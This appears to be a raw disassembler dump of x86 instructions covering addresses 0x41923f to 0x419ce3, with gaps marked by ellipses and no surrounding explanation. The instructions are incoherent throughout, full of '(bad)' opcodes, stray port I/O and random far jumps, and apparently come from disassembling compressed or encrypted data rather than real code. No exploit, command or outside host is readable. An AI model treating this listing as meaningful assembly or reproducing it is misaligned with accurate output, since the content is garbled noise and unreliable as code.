  41923f:	xchg   ebp,eax
  419240:	in     al,dx
  419241:	or     ebx,0xffffff87
  419244:	(bad)  
  419245:	mov    esp,0xb3507d66
  41924a:	fsubr  st(6),st
  41924c:	sar    DWORD PTR [ebp-0x2e14ad0b],cl
  419252:	pushf  
  419253:	mov    al,0xe3
  419255:	ror    BYTE PTR [edx],cl
  419257:	xor    esp,DWORD PTR [ecx-0x77]
  41925a:	in     al,dx
  41925b:	les    edx,FWORD PTR [edi-0x2479f12a]
  419261:	popa   
  419262:	cmp    al,0x9
  419264:	sbb    ebx,DWORD PTR [edi]
  419266:	(bad)  [esi-0x7c16a2af]
  41926c:	xchg   edx,eax
  41926d:	mov    WORD PTR ds:0x2df0079e,ds
  419273:	repz cmc 
  419275:	mov    ah,0x18
  419277:	cli    
  419278:	adc    DWORD PTR [edx-0x370af5bd],edx
  41927e:	and    BYTE PTR ds:0x87a6a75c,al
  419284:	mov    ds:0xd9330e76,al
  419289:	sub    eax,DWORD PTR [ebp+0x41]
  41928c:	stos   BYTE PTR es:[edi],al
  41928d:	cmp    al,0x5f
  41928f:	pop    es
  419290:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419291:	pop    eax
  419292:	cmp    BYTE PTR [esi],dh
  419294:	cmp    eax,0x39f926db
  419299:	pop    ebp
  41929a:	repnz cli 
  41929c:	fld    DWORD PTR [ebp-0x7dbc20b9]
  4192a2:	and    eax,0x6c82ecc9
  4192a7:	mov    al,0xcf
  4192a9:	out    0xc8,eax
  4192ab:	or     al,0x64
  4192ad:	sbb    DWORD PTR [ebx+0x49],0x5b2d3deb
  4192b4:	mov    ah,0x9
  4192b6:	mov    DWORD PTR [esi],ebx
  4192b8:	scas   eax,DWORD PTR es:[edi]
  4192b9:	sbb    bh,ch
  4192bb:	fs dec ebx
  4192bd:	inc    ebp
  4192be:	inc    ebx
  4192bf:	retf   0x949f
  4192c2:	jmp    0xace05df3
  4192c7:	ja     0x41933b
  4192c9:	mov    DWORD PTR [esi+eax*2],edi
  4192cc:	fs icebp 
  4192ce:	push   edx
  4192cf:	xchg   DWORD PTR [edi],ecx
  4192d1:	cs das 
  4192d3:	push   0xf43c7568
  4192d8:	push   cs
  4192d9:	jmp    0xc36f7341
  4192de:	ins    BYTE PTR es:[edi],dx
  4192df:	mov    WORD PTR [edx],gs
  4192e1:	inc    esi
  4192e2:	add    esp,edi
  4192e4:	mov    DWORD PTR [esi],esp
  4192e6:	mov    edx,0x4abbee2a
  4192eb:	inc    edi
  4192ec:	mov    ah,0x28
	...
  419356:	mov    al,ds:0xff33bae7
  41935b:	jg     0x419306
  41935d:	neg    eax
  41935f:	pop    ss
  419360:	daa    
  419361:	inc    edi
  419362:	and    BYTE PTR [edi+0xf67c02b],0x1
  419369:	add    BYTE PTR [eax],al
  41936b:	add    DWORD PTR [eax],eax
  41936d:	add    BYTE PTR [ebp-0x7c980377],bl
  419373:	sbb    esi,DWORD PTR [edi-0x2]
  419376:	dec    eax
  419377:	jbe    0x4193f7
  419379:	(bad)  
  41937a:	(bad)  
  41937b:	loopne 0x4193cb
  41937d:	fld    DWORD PTR [esi-0x8]
  419380:	loop   0x419396
  419382:	into   
  419383:	scas   al,BYTE PTR es:[edi]
  419384:	fst    st(3)
  419386:	jg     0x41939f
  419388:	stos   BYTE PTR es:[edi],al
  419389:	mov    ah,0xc6
  41938b:	add    eax,0x727ebbb4
  419390:	(bad)  
  419391:	popa   
  419392:	add    ecx,DWORD PTR [ebx-0x1]
  419395:	add    ch,BYTE PTR [edx+ebp*4]
  419398:	(bad)  
  419399:	rol    al,1
  41939b:	repnz push ecx
  41939d:	mov    esp,0xbd7b8755
  4193a2:	push   esp
  4193a3:	jns    0x419386
  4193a5:	ja     0x419348
  4193a7:	loop   0x41936f
  4193a9:	push   edi
  4193aa:	sub    bh,BYTE PTR [ecx+esi*4+0x625b5332]
  4193b1:	add    BYTE PTR [eax-0x1f],bl
  4193b4:	jb     0x419352
  4193b6:	in     al,dx
  4193b7:	inc    ebx
  4193b8:	stos   BYTE PTR es:[edi],al
  4193b9:	push   es
  4193ba:	out    0x1d,eax
  4193bc:	repz scas eax,DWORD PTR es:[edi]
  4193be:	xor    eax,DWORD PTR [ebx]
  4193c0:	clc    
  4193c1:	push   ebx
  4193c2:	jne    0x41942c
  4193c4:	jnp    0x4193ca
  4193c6:	lea    esi,[esi-0x1e]
  4193c9:	stos   DWORD PTR es:[edi],eax
  4193ca:	outs   dx,DWORD PTR ds:[esi]
  4193cb:	(bad)  
  4193cd:	mov    ebx,0x192550d0
  4193d2:	dec    DWORD PTR [eax]
  4193d4:	imul   edi,DWORD PTR [ecx+0x51],0x65
  4193d8:	adc    ch,BYTE PTR [edi-0x2930d329]
  4193de:	push   cs
  4193df:	jp     0x41937e
  4193e1:	loop   0x41939e
  4193e3:	inc    edi
  4193e4:	jecxz  0x41940f
  4193e6:	sbb    al,0xcc
  4193e8:	loop   0x419454
  4193ea:	iret   
  4193eb:	out    0x37,eax
  4193ed:	lahf   
  4193ee:	repz inc ebp
  4193f0:	in     eax,dx
  4193f1:	lods   al,BYTE PTR gs:[esi]
  4193f3:	xchg   BYTE PTR [edx-0x334a0cc7],bh
  4193f9:	dec    eax
  4193fa:	in     al,dx
  4193fb:	xchg   edi,eax
  4193fc:	sbb    dh,cl
  4193fe:	je     0x419455
  419400:	repnz sbb DWORD PTR [edi+0x60],edx
  419404:	in     eax,dx
  419405:	adc    bh,BYTE PTR [ebx]
  419407:	in     eax,dx
  419408:	pop    ebx
  419409:	fidiv  WORD PTR [esi-0x26]
  41940c:	je     0x4193b9
  41940e:	jmp    0x1e439bc
  419413:	stos   DWORD PTR es:[edi],eax
  419414:	mov    edi,0x1908841b
  419419:	xor    bh,BYTE PTR [eax-0x14]
  41941c:	mov    cl,0x10
  41941e:	cmc    
  41941f:	inc    esp
  419420:	sub    esp,edx
  419422:	adc    dl,BYTE PTR [ebp-0x783c1aa0]
  419428:	xor    BYTE PTR [ecx-0x63664deb],cl
  41942e:	push   cs
  41942f:	fst    QWORD PTR [edx-0x7676c5c]
  419435:	adc    DWORD PTR [ebx-0x2fcf4eca],0xffffffb4
  41943c:	ja     0x419441
  41943e:	(bad)  
  41943f:	(bad)  
  419440:	in     al,0xe7
  419442:	int    0x15
  419444:	inc    edx
  419445:	fst    QWORD PTR [ebp-0x2c5af7a6]
  41944b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41944c:	or     BYTE PTR [edx-0x2f59d3fd],ch
  419452:	mov    ecx,0xcd511183
  419457:	fs ins BYTE PTR es:[edi],dx
  419459:	push   edi
  41945a:	mov    esi,0x58ec2c0c
  41945f:	cmp    cl,BYTE PTR [bp+si+0x4f]
  419463:	xor    dl,BYTE PTR [edx+0x13]
  419466:	pop    ds
  419467:	imul   esp,ecx,0x1fec388
  41946d:	daa    
	...
  4194d6:	cmp    eax,0xed3a6998
  4194db:	sti    
  4194dc:	jg     0x41947d
  4194de:	cmp    ebx,esi
  4194e0:	je     0x4194a8
  4194e2:	ss (bad) 
  4194e4:	adc    DWORD PTR [ecx+0x67],ebp
  4194e7:	adc    BYTE PTR [ecx],al
  4194e9:	add    BYTE PTR [eax],al
  4194eb:	add    DWORD PTR [eax],eax
  4194ed:	add    ch,bl
  4194ef:	sti    
  4194f0:	sbb    eax,0xed5926d
  4194f5:	or     cl,BYTE PTR [eax-0x6c]
  4194f8:	ret    
  4194f9:	repz ret 0x51a8
  4194fd:	mov    al,0x3f
  4194ff:	mov    ebp,0x6fce98bc
  419504:	xchg   DWORD PTR [eax+0x16c21824],esp
  41950a:	fmul   DWORD PTR [ebx+ebx*1]
  41950d:	xor    DWORD PTR cs:[ebx],edx
  419510:	les    ecx,FWORD PTR [ecx-0x7d]
  419513:	(bad)  
  419515:	dec    ebx
  419516:	ret    
  419517:	and    al,0xa6
  419519:	sub    eax,0x43a0948c
  41951e:	mov    eax,0xfdf1a8f4
  419523:	inc    eax
  419524:	mov    ah,0xa8
  419526:	dec    ecx
  419527:	jnp    0x4194ff
  419529:	sbb    BYTE PTR [eax+0x36],ch
  41952c:	jns    0x4194df
  41952e:	mov    eax,ds:0x1c34b130
  419533:	fs or  eax,0x18e1155e
  419539:	lock sbb ebp,edi
  41953c:	add    al,0x48
  41953e:	nop
  41953f:	sub    ebx,DWORD PTR [edi]
  419541:	js     0x419537
  419543:	cmc    
  419544:	and    al,0xfe
  419546:	fs mov ah,0x64
  419549:	neg    BYTE PTR [esi]
  41954b:	fst    st(2)
  41954d:	mov    DWORD PTR es:[edi],esi
  419550:	xor    eax,DWORD PTR [edi]
  419552:	or     esp,DWORD PTR [eax-0xfabe54e]
  419558:	mov    WORD PTR [esi+0x276eed45],?
  41955e:	sub    al,0x68
  419560:	push   cs
  419561:	pop    esp
  419562:	dec    esi
  419563:	fld    QWORD PTR [esp+0x6d]
  419567:	pop    ds
  419568:	in     eax,0x81
  41956a:	cdq    
  41956b:	mov    ch,ch
  41956d:	sub    al,0x1
  41956f:	stos   BYTE PTR es:[edi],al
  419570:	(bad)  
  419571:	inc    ebp
  419572:	stos   DWORD PTR es:[edi],eax
  419573:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419574:	mov    edx,0x1cdf99e2
  419579:	fs icebp 
  41957b:	sub    BYTE PTR [eax-0x76113c72],cl
  419581:	jmp    0x59c09b8f
  419586:	dec    edi
  419587:	xchg   edi,eax
  419588:	cmp    BYTE PTR [edi-0x73],ch
  41958b:	cli    
  41958c:	pop    edi
  41958d:	fsubr  DWORD PTR [ecx-0x2460ddf6]
  419593:	fucomp st(6)
  419595:	pusha  
  419596:	push   edi
  419597:	call   0x3297:0xd5575635
  41959e:	push   esi
  41959f:	ja     0x4195e9
  4195a1:	call   0x63b3:0x390b1db6
  4195a8:	es shr edi,0x22
  4195ac:	out    dx,al
  4195ad:	push   es
  4195ae:	mov    cl,0x19
  4195b0:	in     eax,dx
  4195b1:	es in  al,dx
  4195b3:	jns    0x4195b9
  4195b5:	ret    0xd106
  4195b8:	push   ecx
  4195b9:	pop    ecx
  4195ba:	jb     0x4195c7
  4195bc:	jmp    0x4195c9
  4195be:	stos   BYTE PTR es:[edi],al
  4195bf:	inc    ebx
  4195c0:	mov    dl,0xe8
  4195c2:	dec    esi
  4195c3:	sbb    ebp,DWORD PTR [ecx+ebp*4-0x47de4d0c]
  4195ca:	fisubr DWORD PTR [ebp-0x5710eaf3]
  4195d0:	inc    ecx
  4195d1:	xor    eax,0x8c870937
  4195d6:	aaa    
  4195d7:	lods   al,BYTE PTR ds:[esi]
  4195d8:	or     ch,BYTE PTR [ecx+0x64]
  4195db:	sub    edx,ecx
  4195dd:	jp     0x419636
  4195df:	mov    ebp,0x14f909cf
  4195e4:	retf   
  4195e5:	xchg   DWORD PTR [eax-0x5a],esp
  4195e8:	mov    cs,WORD PTR [eax+0x17]
  4195eb:	sbb    ch,BYTE PTR [edi-0x79]
	...
  419656:	scas   eax,DWORD PTR es:[edi]
  419657:	aam    0x8d
  419659:	(bad)  
  41965a:	(bad)  
  41965b:	jnp    0x41964c
  41965d:	fstp   st(1)
  41965f:	fcomp  QWORD PTR [ebx+0x2f]
  419662:	imul   ecx
  419664:	aas    
  419665:	lock adc DWORD PTR [bx+di],eax
  419669:	add    BYTE PTR [eax],al
  41966b:	add    DWORD PTR [eax],eax
  41966d:	add    BYTE PTR [eax-0xa],ch
  419670:	fstp   DWORD PTR [ecx-0x23]
  419673:	(bad)  
  419674:	mov    esp,edi
  419676:	mov    ds:0xa35524,eax
  41967b:	mov    edi,0xbadde281
  419680:	sahf   
  419681:	xchg   ebx,eax
  419682:	xchg   edi,eax
  419683:	popa   
  419684:	cmc    
  419685:	xchg   ebp,eax
  419686:	xlat   BYTE PTR ds:[ebx]
  419687:	jecxz  0x419620
  419689:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41968a:	sbb    eax,0x347cf513
  41968f:	pop    es
  419690:	and    al,0xde
  419692:	int    0x2d
  419694:	mov    BYTE PTR [edi+eax*8],dl
  419697:	jb     0x41963f
  419699:	dec    edi
  41969a:	push   edi
  41969b:	fisttp DWORD PTR [ecx+eax*1]
  41969e:	jl     0x419678
  4196a0:	sub    edx,ebp
  4196a2:	js     0x419662
  4196a4:	leave  
  4196a5:	push   eax
  4196a6:	or     al,0x68
  4196a8:	lods   eax,DWORD PTR ds:[esi]
  4196a9:	push   ebx
  4196aa:	push   cs
  4196ab:	lods   eax,DWORD PTR ds:[esi]
  4196ac:	leave  
  4196ad:	xlat   BYTE PTR ds:[ebx]
  4196ae:	out    0x8c,al
  4196b0:	and    BYTE PTR [ecx+eax*1+0x5d],ch
  4196b4:	mov    dh,0xcc
  4196b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196b7:	sub    dh,BYTE PTR [edi-0x33]
  4196ba:	mov    ebp,0xcffd5c0a
  4196bf:	stos   BYTE PTR es:[edi],al
  4196c0:	test   al,0xac
  4196c2:	jmp    0x419734
  4196c4:	popf   
  4196c5:	dec    ebx
  4196c6:	and    BYTE PTR [edx],0x89
  4196c9:	lea    esp,[ecx]
  4196cb:	les    ebp,FWORD PTR [edi+ebp*2+0x39]
  4196cf:	and    dh,BYTE PTR [edx+eiz*8+0x7e]
  4196d3:	pop    ebx
  4196d4:	cmp    DWORD PTR [edi],ebx
  4196d6:	in     al,dx
  4196d7:	pop    ecx
  4196d8:	out    dx,al
  4196d9:	xchg   ebp,eax
  4196da:	or     al,0xf4
  4196dc:	fs popa 
  4196de:	cli    
  4196df:	and    dl,0xf1
  4196e2:	out    dx,al
  4196e3:	push   ebp
  4196e4:	cdq    
  4196e5:	dec    esi
  4196e6:	loope  0x4196fa
  4196e8:	mov    edx,0x2137f977
  4196ed:	lods   al,BYTE PTR ds:[esi]
  4196ee:	mov    ds:0xb8af9af2,eax
  4196f3:	sub    ebx,DWORD PTR [si]
  4196f6:	add    BYTE PTR [eax],ch
  4196f8:	xor    al,0xf0
  4196fa:	mov    al,0xf5
  4196fc:	mov    ds:0x2ba883cc,al
  419701:	inc    esp
  419702:	gs stos BYTE PTR es:[edi],al
  419704:	test   ah,bh
  419706:	pop    ebx
  419707:	arpl   WORD PTR [ecx],sp
  419709:	retf   0x221f
  41970c:	xor    eax,DWORD PTR [ebx]
  41970e:	ficom  WORD PTR [ecx+0x44]
  419711:	cld    
  419712:	cmp    BYTE PTR [ecx],cl
  419714:	mov    al,ds:0x9f60cd55
  419719:	xchg   ebx,eax
  41971a:	push   edx
  41971b:	out    dx,eax
  41971c:	mov    esi,0xc67ed88a
  419721:	call   0x864aa185
  419726:	retf   0x3df
  419729:	pop    edi
  41972a:	cmp    al,BYTE PTR [edi-0x52fc024f]
  419730:	xchg   esi,eax
  419731:	shl    BYTE PTR [esi-0x8f58bc],0xfc
  419738:	or     eax,0xb489fcda
  41973d:	mov    edi,0x4d21d34d
  419742:	fbstp  TBYTE PTR [ebx-0x6c0b97c5]
  419748:	(bad)  
  419749:	and    DWORD PTR [edx+0x11],esi
  41974c:	or     BYTE PTR [ecx+eax*4+0x5349ccf6],dl
  419753:	mov    dl,0x9d
  419755:	inc    ecx
  419756:	adc    ch,BYTE PTR [esi-0x7a495f59]
  41975c:	jl     0x419776
  41975e:	and    edx,DWORD PTR [ebp+0x6f9ede8f]
  419764:	jnp    0x4197c9
  419766:	sbb    esp,DWORD PTR [ebx+0x7e]
  419769:	popa   
  41976a:	sbb    ch,BYTE PTR [edx]
  41976c:	loop   0x419738
	...
  4197d6:	mov    bl,0x3f
  4197d8:	jno    0x41983f
  4197da:	std    
  4197db:	outs   dx,DWORD PTR ds:[esi]
  4197dc:	mov    bh,0xff
  4197de:	add    eax,0xc68dd0ae
  4197e3:	sub    bh,BYTE PTR [edx+0x4b]
  4197e6:	adc    al,BYTE PTR [bx+di]
  4197e9:	add    BYTE PTR [eax],al
  4197eb:	add    DWORD PTR [eax],eax
  4197ed:	add    BYTE PTR [edi-0x7e0e9ccf],ah
  4197f3:	ret    0xaa40
  4197f6:	outs   dx,BYTE PTR ds:[esi]
  4197f7:	arpl   WORD PTR [ebp-0x26a1241b],ax
  4197fd:	(bad)  
  4197fe:	mov    ecx,0xcb764ed7
  419803:	sub    al,0xd0
  419805:	aas    
  419806:	mov    dh,0x36
  419808:	xor    BYTE PTR [eax+0x48afe871],0x95
  41980f:	mov    bl,0x84
  419811:	push   ecx
  419812:	nop
  419813:	mov    eax,0x36038aa2
  419818:	bswap  esi
  41981a:	sti    
  41981b:	mov    bl,BYTE PTR [edx+0x41]
  41981e:	cmp    eax,0x54254ece
  419823:	cmp    eax,0xb5bafe2b
  419828:	xchg   edx,eax
  419829:	adc    eax,0x88cfa70c
  41982e:	jmp    0x12c9235f
  419833:	fisub  WORD PTR [edx-0x1b130fed]
  419839:	sbb    al,0x16
  41983b:	iret   
  41983c:	iret   
  41983d:	xchg   edx,eax
  41983e:	xchg   esp,eax
  41983f:	scas   al,BYTE PTR es:[edi]
  419840:	ins    DWORD PTR es:[edi],dx
  419841:	cwde   
  419842:	push   0x46
  419844:	xchg   esp,eax
  419845:	jp     0x419817
  419847:	rol    BYTE PTR [ebx-0x40],0x9e
  41984b:	je     0x419848
  41984d:	mov    BYTE PTR [ecx+0x7ec8676],dh
  419853:	js     0x4197ee
  419855:	loop   0x419821
  419857:	adc    al,0x50
  419859:	sahf   
  41985a:	push   ebp
  41985b:	push   cs
  41985c:	xor    eax,0x173214f9
  419861:	frstor [edx]
  419863:	int    0xcb
  419865:	int    0xff
  419867:	sbb    DWORD PTR [ebx+0x7b1fde43],eax
  41986d:	cmp    eax,0x6c784697
  419872:	mov    DWORD PTR [eax-0x1bb9ac08],ecx
  419878:	adc    DWORD PTR [ecx],0x16
  41987b:	fild   DWORD PTR [ecx+0x47]
  41987e:	inc    ebp
  41987f:	imul   esp,DWORD PTR [ebp+0x624300ac],0x21
  419886:	les    esi,FWORD PTR [edx+0x45083f1c]
  41988c:	iret   
  41988d:	jge    0x41989b
  41988f:	fstp   DWORD PTR [edx]
  419891:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419892:	fidivr WORD PTR [ebx+eiz*4-0x63f492da]
  419899:	and    BYTE PTR [ebx+0x9],dh
  41989c:	cwde   
  41989d:	data16 stos BYTE PTR es:[edi],al
  41989f:	pop    edx
  4198a0:	jb     0x419870
  4198a2:	popa   
  4198a3:	cmp    eax,DWORD PTR [esi-0x6138f76b]
  4198a9:	sbb    DWORD PTR [ecx],0x3e3cf3c8
  4198af:	ficom  WORD PTR [eax+0x36609c9]
  4198b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198b6:	push   es
  4198b7:	pop    es
  4198b8:	or     ecx,edi
  4198ba:	inc    esp
  4198bb:	ret    0x522c
  4198be:	or     DWORD PTR [esi-0x25349f5],ebp
  4198c4:	pushf  
  4198c5:	sbb    BYTE PTR ss:[di],0xd6
  4198ca:	or     eax,0x388bc626
  4198cf:	inc    ebp
  4198d0:	(bad)  
  4198d1:	call   0x196a:0x79ff66a
  4198d8:	push   0x106847cd
  4198dd:	jg     0x41995d
  4198df:	retf   0xcde5
  4198e2:	jp     0x4198a1
  4198e4:	in     eax,0x59
  4198e6:	cmp    ch,BYTE PTR [esi]
  4198e8:	lock idiv BYTE PTR [eax]
  4198eb:	mov    dl,BYTE PTR [ebp+edi*1+0x0]
	...
  419956:	sbb    BYTE PTR [ecx],0x47
  419959:	loope  0x41993a
  41995b:	jmp    DWORD PTR [esi+0x45e3657b]
  419961:	fnstsw WORD PTR [esi]
  419963:	lea    edx,[ecx+0x11367ce]
  419969:	add    BYTE PTR [eax],al
  41996b:	add    DWORD PTR [eax],eax
  41996d:	add    BYTE PTR [ebx+ebp*4],bl
  419970:	sbb    edx,esp
  419972:	mov    ebp,0xfae891dc
  419977:	imul   edi,DWORD PTR [eax],0xb4340d09
  41997d:	dec    ecx
  41997e:	or     al,0xaf
  419980:	cmc    
  419981:	sbb    cl,BYTE PTR [esi+0x2da2177a]
  419987:	stos   BYTE PTR es:[edi],al
  419988:	js     0x4199fd
  41998a:	rol    DWORD PTR [ecx+0x46c3a8af],0xe
  419991:	ja     0x41996f
  419993:	stc    
  419994:	scas   al,BYTE PTR es:[edi]
  419995:	aad    0xca
  419997:	repz mov ebp,0xcc363b9d
  41999d:	jecxz  0x4199b1
  41999f:	shl    BYTE PTR [bp+si-0x77],0x8
  4199a4:	inc    edi
  4199a5:	out    0x7e,al
  4199a7:	call   0x4acb:0x979cfd46
  4199ae:	push   ebp
  4199af:	mov    dl,BYTE PTR [ebx-0x15]
  4199b2:	cli    
  4199b3:	jmp    0xa724:0xa7255246
  4199ba:	mov    ebx,0x97564190
  4199bf:	mov    dl,0xe3
  4199c1:	hlt    
  4199c2:	sub    al,0x4b
  4199c4:	fsub   QWORD PTR [ebx+0x5739c5d2]
  4199ca:	ror    BYTE PTR [edi+0x4d],0xe7
  4199ce:	xor    al,0x84
  4199d0:	mov    ch,0x6a
  4199d2:	popf   
  4199d3:	lahf   
  4199d4:	ss fscale 
  4199d7:	xor    bh,BYTE PTR [edi+0x42d449e1]
  4199dd:	es inc ebp
  4199df:	rol    DWORD PTR [ebx-0x22],0xc7
  4199e3:	sub    BYTE PTR [ecx],dl
  4199e5:	lahf   
  4199e6:	pop    ebx
  4199e7:	inc    esi
  4199e8:	mov    ebp,0x6a09a15b
  4199ed:	cmp    cl,BYTE PTR [ecx-0x3ac2428e]
  4199f3:	cmp    edi,esi
  4199f5:	or     BYTE PTR [edi+0x21],bh
  4199f8:	les    esp,FWORD PTR [ebx]
  4199fa:	xchg   DWORD PTR [ecx-0x41],ebx
  4199fd:	push   esi
  4199fe:	sbb    bh,BYTE PTR [esi+0x59]
  419a01:	int    0x32
  419a03:	out    0x20,eax
  419a05:	hlt    
  419a06:	cwde   
  419a07:	pop    ecx
  419a08:	dec    edx
  419a09:	sbb    DWORD PTR [eax+edx*1+0x5933403c],eax
  419a10:	mov    al,0xd2
  419a12:	es in  eax,dx
  419a14:	sub    edx,DWORD PTR [ebx]
  419a16:	cmp    BYTE PTR [eax-0x27],cl
  419a19:	or     dl,BYTE PTR [eax-0x7a926b18]
  419a1f:	fidiv  WORD PTR [ebx-0x16c307ec]
  419a25:	mov    eax,ds:0x8f964396
  419a2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a2b:	fnstenv [ecx+esi*8-0x116cdb7d]
  419a32:	div    BYTE PTR [ebx]
  419a34:	xor    BYTE PTR [eax-0xf],ch
  419a37:	call   0xf496:0x77736ef2
  419a3e:	mov    dh,0x2b
  419a40:	leave  
  419a41:	xor    cl,dh
  419a43:	mov    ecx,DWORD PTR gs:[ebx]
  419a46:	loop   0x4199cb
  419a48:	fmul   DWORD PTR [ecx+esi*8+0x607d7fc9]
  419a4f:	enter  0x64b9,0x75
  419a53:	adc    edi,0xf088c368
  419a59:	addr16 into 
  419a5b:	push   0x72
  419a5d:	jne    0x419a78
  419a5f:	dec    ecx
  419a60:	addr16 into 
  419a62:	dec    ebp
  419a63:	int3   
  419a64:	mov    ah,0xdb
  419a66:	adc    eax,0x54c7f76
  419a6b:	jl     0x419a4b
  419a6d:	in     eax,dx
	...
  419ad6:	xor    esi,DWORD PTR [ecx]
  419ad8:	xchg   ebx,eax
  419ad9:	lds    edx,FWORD PTR [ebx-0x34088819]
  419adf:	rcl    DWORD PTR ds:0xddbea1c2,cl
  419ae5:	mov    al,ds:0x11467
  419aea:	add    BYTE PTR [ecx],al
  419aec:	add    BYTE PTR [eax],al
  419aee:	aas    
  419aef:	mov    ah,ah
  419af1:	mov    cl,0x99
  419af3:	popf   
  419af4:	mov    ds:0x97ad5655,eax
  419af9:	inc    ebx
  419afa:	xchg   ebx,eax
  419afb:	imul   ebx,DWORD PTR [ebp-0x3b15a5e8],0xeeca5117
  419b05:	loopne 0x419ac5
  419b07:	cdq    
  419b08:	xor    al,0x82
  419b0a:	arpl   WORD PTR [ebx-0x1d918bf1],cx
  419b10:	dec    edi
  419b11:	sahf   
  419b12:	xor    eax,0xe0832a58
  419b17:	mov    bh,0xc1
  419b19:	data16 and al,0x11
  419b1c:	test   eax,0x592b2298
  419b21:	or     bl,BYTE PTR [ebp+0x36]
  419b24:	xlat   BYTE PTR ds:[ebx]
  419b25:	stos   DWORD PTR es:[edi],eax
  419b26:	js     0x419b79
  419b28:	add    DWORD PTR [eax],ebx
  419b2a:	in     eax,0xdd
  419b2c:	or     BYTE PTR [ebx-0x12d2a96e],dh
  419b32:	pop    edi
  419b33:	pop    ss
  419b34:	jb     0x419ade
  419b36:	xchg   ecx,eax
  419b37:	sahf   
  419b38:	sub    al,0x41
  419b3a:	dec    esp
  419b3b:	(bad)  
  419b3c:	mov    al,dl
  419b3e:	xchg   edi,eax
  419b3f:	sub    eax,0x35f8ee32
  419b44:	sbb    al,ch
  419b46:	fiadd  DWORD PTR [eax+ebx*1-0x99774b7]
  419b4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b4e:	loope  0x419b77
  419b50:	mov    cl,0x5a
  419b52:	adc    cl,BYTE PTR [ecx-0x225e56c6]
  419b58:	sbb    eax,0x3a11a5b4
  419b5d:	and    bl,BYTE PTR [ebx-0x291b087b]
  419b63:	mov    dh,0x9
  419b65:	ret    0x9f83
  419b68:	jns    0x419b88
  419b6a:	fsub   st,st(7)
  419b6c:	xchg   esi,eax
  419b6d:	pop    eax
  419b6e:	aad    0x12
  419b70:	xlat   BYTE PTR ds:[ebx]
  419b71:	push   edx
  419b72:	mov    edi,es
  419b74:	jmp    0x205da602
  419b79:	jno    0x419b3c
  419b7b:	fnstsw WORD PTR [ebp-0x73685ab3]
  419b81:	pop    edi
  419b82:	pop    ebx
  419b83:	fild   WORD PTR [edi+0x51]
  419b86:	xor    ch,BYTE PTR [esi+ebp*8-0x3672849c]
  419b8d:	adc    DWORD PTR [eax+0x4ab5719e],0x15
  419b94:	dec    esp
  419b95:	enter  0x900b,0x38
  419b99:	pusha  
  419b9a:	jmp    0xe893:0xf7a6ac33
  419ba1:	xor    ch,cl
  419ba3:	jmp    ecx
  419ba5:	and    BYTE PTR [eax],dh
  419ba7:	loopne 0x419b68
  419ba9:	mov    BYTE PTR [eax+0xb],dl
  419bac:	fs data16 jp 0x419c23
  419bb0:	ret    0xdc3d
  419bb3:	xor    eax,0x45073e80
  419bb8:	dec    ecx
  419bb9:	lds    ecx,FWORD PTR [esi+0x74]
  419bbc:	push   es
  419bbd:	inc    edx
  419bbe:	fdivr  DWORD PTR [eax+edi*1+0x6a92f6f5]
  419bc5:	and    dh,BYTE PTR [edx+edx*2]
  419bc8:	cld    
  419bc9:	and    eax,0x55c72cea
  419bce:	mov    BYTE PTR [eax+0x1cad3689],bh
  419bd4:	call   ebx
  419bd6:	xor    eax,0x8e7af7cc
  419bdb:	push   cs
  419bdc:	out    0xca,eax
  419bde:	fs ins DWORD PTR es:[edi],dx
  419be0:	add    BYTE PTR [ebx+0x15],ch
  419be3:	(bad)  
  419be4:	xor    DWORD PTR [edi],edi
  419be6:	loopne 0x419b9d
  419be8:	push   ebp
  419be9:	test   BYTE PTR [ebx-0x54],al
  419bec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419bed:	xor    eax,DWORD PTR [eax]
	...
  419c53:	add    BYTE PTR [eax],al
  419c55:	add    BYTE PTR [edx-0x3c],cl
  419c58:	cli    
  419c59:	inc    edi
  419c5a:	(bad)  
  419c5b:	jg     0x419c5c
  419c5d:	int    0x88
  419c5f:	xchg   ecx,eax
  419c60:	lods   al,BYTE PTR ds:[esi]
  419c61:	or     al,0x33
  419c63:	dec    eax
  419c64:	pop    ecx
  419c65:	and    DWORD PTR [edi+0x15],0x1
  419c69:	add    BYTE PTR [eax],al
  419c6b:	add    DWORD PTR [eax],eax
  419c6d:	add    BYTE PTR [ebp+ebx*4+0x45],ah
  419c71:	push   ecx
  419c72:	pushf  
  419c73:	xor    edx,0x45c7d917
  419c79:	int3   
  419c7a:	out    dx,al
  419c7b:	or     eax,DWORD PTR [esi-0x1e579c26]
  419c81:	call   0xabee:0x7a6489ba
  419c88:	xor    eax,0x82025c8f
  419c8d:	pop    ebp
  419c8e:	jmp    FWORD PTR es:[eax]
  419c91:	lods   eax,DWORD PTR ds:[esi]
  419c92:	fld    TBYTE PTR [eax]
  419c94:	mov    ds:0x2b728050,eax
  419c99:	scas   eax,DWORD PTR es:[edi]
  419c9a:	rol    DWORD PTR [ebx+0x507f0516],0xa9
  419ca1:	push   ds
  419ca2:	(bad)  
  419ca3:	addr16 mov esp,0x75e27cc7
  419ca9:	xchg   edx,eax
  419caa:	pop    ss
  419cab:	and    bh,BYTE PTR ds:0xe5e1a1d2
  419cb1:	mov    cl,0x28
  419cb3:	out    dx,al
  419cb4:	stos   DWORD PTR es:[edi],eax
  419cb5:	int    0x60
  419cb7:	dec    ebp
  419cb8:	sub    BYTE PTR [edi-0x11fbe053],0xb8
  419cbf:	inc    ebx
  419cc0:	in     eax,0x72
  419cc2:	xor    esi,DWORD PTR [ebx]
  419cc4:	rcr    BYTE PTR [ebp+0x2],1
  419cc7:	xchg   BYTE PTR [edx+0x73],ah
  419cca:	add    bl,al
  419ccc:	ds (bad) 
  419cce:	ficomp WORD PTR [eax]
  419cd0:	mov    ebp,0xa302c2ad
  419cd5:	xor    DWORD PTR [ebx-0x11],0xffffffb5
  419cd9:	(bad)  [edx+0x3f]
  419cdc:	adc    al,0xe0
  419cde:	cmp    BYTE PTR [ebx-0x5d],0x7c
  419ce2:	pop    ds
  419ce3:	fs jecxz 0x419cb9
